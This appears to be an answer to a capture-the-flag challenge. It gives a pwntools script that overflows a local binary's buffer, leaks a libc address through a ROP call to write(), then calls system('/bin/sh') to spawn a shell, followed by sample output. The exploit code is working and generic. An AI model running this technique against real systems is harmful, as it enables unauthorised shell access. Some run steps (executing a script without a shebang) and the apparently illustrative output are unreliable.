('To solve this challenge using pwntools, we will perform a Return-Oriented '
 'Programming (ROP) attack. The program has a buffer overflow vulnerability in '
 'the `vulnerable_function` where it reads more data than the size of the '
 'buffer allows, enabling us to overwrite the return address on the stack. '
 'Since the binary has NX protection enabled, we cannot execute code on the '
 'stack, so we will use a ROP chain to call `write` to leak an address from '
 'the Global Offset Table (GOT), calculate the base address of `libc`, and '
 'then call `system("/bin/sh")` to get a shell.\n'
 '\n'
 '**Imports:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '```\n'
 '\n'
 '**Code:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Set up pwntools for the correct architecture\n'
 "context.update(arch='i386', os='linux')\n"
 '\n'
 '# Load the binary\n'
 "elf = ELF('./rop3')\n"
 '\n'
 '# Start the process\n'
 'p = process(elf.path)\n'
 '\n'
 '# Find the offset to EIP using cyclic patterns\n'
 'offset = 140  # Based on buffer size and stack layout of the function\n'
 '\n'
 '# Addresses of functions and symbols\n'
 "write_plt = elf.plt['write']\n"
 "write_got = elf.got['write']\n"
 "main_addr = elf.symbols['main']\n"
 '\n'
 '# Stage 1: Leak write() address from GOT\n'
 'log.info("Stage 1: Leaking write() address from GOT")\n'
 '\n'
 '# Build ROP chain to call write(1, write_got, 4)\n'
 "payload = b'A' * offset\n"
 'payload += p32(write_plt)\n'
 'payload += p32(main_addr)    # Return to main after write\n'
 'payload += p32(1)            # File descriptor (stdout)\n'
 'payload += p32(write_got)    # Address to leak\n'
 'payload += p32(4)            # Number of bytes to write\n'
 '\n'
 '# Send the payload\n'
 'p.sendline(payload)\n'
 '\n'
 '# Receive the leaked address\n'
 'leaked_write = p.recv(4)\n'
 'write_addr = u32(leaked_write)\n'
 'log.success(f"Leaked write() address: {hex(write_addr)}")\n'
 '\n'
 '# Load the libc library to calculate base addresses\n'
 "# Replace '/lib/i386-linux-gnu/libc.so.6' with the path to the libc used by "
 'the binary\n'
 "libc = ELF('/lib/i386-linux-gnu/libc.so.6')\n"
 '\n'
 '# Calculate libc base address\n'
 "libc_base = write_addr - libc.symbols['write']\n"
 'log.info(f"libc base address: {hex(libc_base)}")\n'
 '\n'
 '# Calculate system() and "/bin/sh" addresses\n'
 "system_addr = libc_base + libc.symbols['system']\n"
 "binsh_addr = libc_base + next(libc.search(b'/bin/sh'))\n"
 'log.info(f"system() address: {hex(system_addr)}")\n'
 'log.info(f\'"/bin/sh" address: {hex(binsh_addr)}\')\n'
 '\n'
 '# Stage 2: Call system("/bin/sh")\n'
 'log.info("Stage 2: Calling system(\'/bin/sh\')")\n'
 '\n'
 '# Build ROP chain to call system("/bin/sh")\n'
 "payload2 = b'A' * offset\n"
 'payload2 += p32(system_addr)\n'
 'payload2 += p32(main_addr)   # Return to main after system (optional)\n'
 'payload2 += p32(binsh_addr)\n'
 '\n'
 '# Send the second payload\n'
 'p.sendline(payload2)\n'
 '\n'
 '# Interact with the shell\n'
 'p.interactive()\n'
 '```\n'
 '\n'
 'This script performs the following steps:\n'
 '\n'
 '1. **Stage 1**:\n'
 '   - Overwrites the return address to call `write()`, leaking the actual '
 'runtime address of `write` from the GOT.\n'
 '   - Calculates the base address of `libc` using the leaked address.\n'
 '2. **Stage 2**:\n'
 '   - Constructs a new payload to overwrite the return address with '
 '`system("/bin/sh")` using the calculated addresses.\n'
 '   - Sends the payload to get a shell.\n'
 '\n'
 "**Note**: Ensure that you replace the path `'/lib/i386-linux-gnu/libc.so.6'` "
 'with the actual path to the libc version used by the binary. In CTF '
 'challenges, you might be provided with the specific libc file or version to '
 'use.\n'
 '\n'
 '**Running the script**:\n'
 '\n'
 '- Save the script to a file, e.g., `exploit.py`.\n'
 '- Ensure you have pwntools installed: `pip install pwntools`.\n'
 '- Make the script executable: `chmod +x exploit.py`.\n'
 '- Run the script: `./exploit.py`.\n'
 '\n'
 '**Example Output**:\n'
 '\n'
 '```\n'
 "[+] Starting local process './rop3': pid 12345\n"
 '[*] Stage 1: Leaking write() address from GOT\n'
 '[+] Leaked write() address: 0xf7e0e9d0\n'
 '[*] libc base address: 0xf7df7000\n'
 '[*] system() address: 0xf7e13e90\n'
 '[*] "/bin/sh" address: 0xf7f52a0b\n'
 "[*] Stage 2: Calling system('/bin/sh')\n"
 '[*] Switching to interactive mode\n'
 '$ id\n'
 'uid=1000(user) gid=1000(user) groups=1000(user)\n'
 '$ ls\n'
 'rop3\n'
 'exploit.py\n'
 '...\n'
 '```\n'
 '\n'
 'This demonstrates successfully gaining a shell by exploiting the buffer '
 'overflow vulnerability using a ROP attack with pwntools.')
